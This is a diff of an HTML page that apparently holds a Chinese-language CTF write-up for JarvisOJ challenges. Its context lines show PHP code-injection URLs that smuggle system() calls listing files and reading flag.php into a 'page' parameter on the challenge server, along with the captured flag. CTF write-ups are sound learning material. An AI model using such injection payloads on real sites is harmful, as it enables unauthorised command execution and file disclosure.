@@ -117,7 +117,7 @@
 <meta property="og:image" content="https://i.loli.net/2018/02/16/5a868e91bd7df.jpg">
 <meta property="og:image" content="https://i.loli.net/2018/02/16/5a868e91dc52e.jpg">
 <meta property="og:image" content="https://i.loli.net/2018/02/16/5a868e91efb5e.jpg">
-<meta property="og:updated_time" content="2018-02-16T07:57:22.509Z">
+<meta property="og:updated_time" content="2018-02-16T08:06:02.958Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="JarvisOJ Writeup">
 <meta name="twitter:description" content="写在最前前天做了MOCTF，有些遗憾，本来能做出来的题却没能做出来(嚎啕大哭)，这次的失误也是因为以前自己做过的题并没有好好总结复习导致的，所以决定重新把之前做过的CTF题翻出来重新做一遍，重新学习吧！由于难度问题，JarvisOJ上的题我还没有完全全部做完，这里先贴出我已经做出来的题目。JarvisOJ：https://www.jarvisoj.com PORT 51根据提示，这里要使用vps上">
@@ -456,6 +456,7 @@
 <p><img src="https://i.loli.net/2018/02/16/5a868e91bd7df.jpg" alt=""><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32798</span><span class="regexp">/?page=flag'.system("ls templates/</span>;<span class="string">").'</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://i.loli.net/2018/02/16/5a868e91dc52e.jpg" alt=""><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32798</span><span class="regexp">/?page=flag'.system("cat templates/</span>flag.php;<span class="string">").'</span></span><br></pre></td></tr></table></figure></p>
 <p>这里差一点就被骗了，因为执行以后页面显示的还是That file doesn’t exist!但是机智的我还是右键源码了一下…所以flag到手。<br><img src="https://i.loli.net/2018/02/16/5a868e91efb5e.jpg" alt=""><br>flag:61dctf{8e_careful_when_us1ng_ass4rt}</p>
+<p>暂时就先写到这里，后续做了会把做好的题目加上去~</p>
 
       
     </div>
